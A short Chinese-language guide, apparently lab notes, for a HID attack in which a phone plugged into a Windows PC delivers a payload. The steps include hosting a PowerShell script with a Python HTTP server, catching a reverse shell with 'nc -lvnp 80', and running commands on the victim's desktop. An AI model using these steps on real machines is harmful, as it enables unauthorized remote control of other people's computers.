### 指南
一台电脑,一台手机,termius连接一台linux服务器
手机负责执行hid attack攻击
linux服务器,用来接收shell(即控制window)
window,用来当靶机,手机插上去且屏幕打开就行
### 步骤
- 攻击机执行`cd /opt/shell;sudo python3 -m http.server 82 &` 用于开启python服务器来访问ps脚本![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230914220718.png)
- 手机连接到电脑usb接口上,作为一个hid attack攻击设备
- linux监听本地端口,在命令行输入`sudo nc -lvnp 80`![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230912235031.png)
*监听成功标志*
- 打开手机
- 单击设备上的preview->点击右上角三角符号开始攻击
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230914134508.png)

- 等待攻击完成即可执行任意命令
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230912235341.png)

*攻击成功标志*
部分命令指南

| 命令                            | 效果                                             | 举例 |
| ------------------------------- | ------------------------------------------------ | ---- |
| echo "\<content\>" > ~/\<name\> | 在对方桌面新建一个\<name\>文件,内容为\<content\> | echo "i am hacker" >~/Desktop/haha.txt     |
|                                 |                                                  |      |



